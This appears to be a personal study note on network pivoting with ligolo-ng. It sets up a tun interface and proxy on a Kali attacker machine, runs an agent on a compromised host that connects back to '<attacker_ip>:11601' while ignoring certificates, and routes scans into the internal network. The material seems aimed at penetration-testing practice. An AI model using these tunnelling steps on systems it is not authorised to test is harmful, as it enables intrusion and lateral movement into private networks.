[https://medium.com/@redfanatic7/guide-to-pivoting-using-ligolo-ng-efd36b290f16](https://medium.com/@redfanatic7/guide-to-pivoting-using-ligolo-ng-efd36b290f16)
  
can download the proxy server (attacker machine) with sudo apt install ligolo-ng
  
set up the proxy before running the agent on compromised computer
```Markdown
sudo ip tuntap add user kali mode tun ligolo
```
```Markdown
sudo ip link set ligolo up
```
![[../assets/Ligolo-ng/image 242.png|image 242.png]]
  
start the proxy server (can use self-signed cert for quicker setup)
```Markdown
ligolo-proxy -selfcert
```
![[../assets/Ligolo-ng/image 1 176.png|image 1 176.png]]
  
once the proxy server it setup, put the agent file on the target system then run the following command
```Markdown
./agent -connect <attacker_ip>:11601 -ignore-cert
```
- once connected, the compromised computer should say that a connection is established
![[../assets/Ligolo-ng/image 2 152.png|image 2 152.png]]
  
once the connection is established, start the tunnel setup
- on proxy server (kali) type “session” and choose the computer you want to tunnel through
- from here, run “ifconfig” to see the internal network you want to communicate with
![[../assets/Ligolo-ng/image 3 134.png|image 3 134.png]]
- the internal network in this case is 192.168.37.129/24
  
add the ip route to the proxy server (kali) to create the tunnel
```Markdown
sudo ip route add <internal network> dev ligolo
```
- you should see the new route for the internal network
![[../assets/Ligolo-ng/image 4 117.png|image 4 117.png]]
  
go back to the ligolo-ng instance and type “start” to initiate the tunnel
![[../assets/Ligolo-ng/image 5 112.png|image 5 112.png]]
  
can now run commands (like nmap) against any machine on the internal network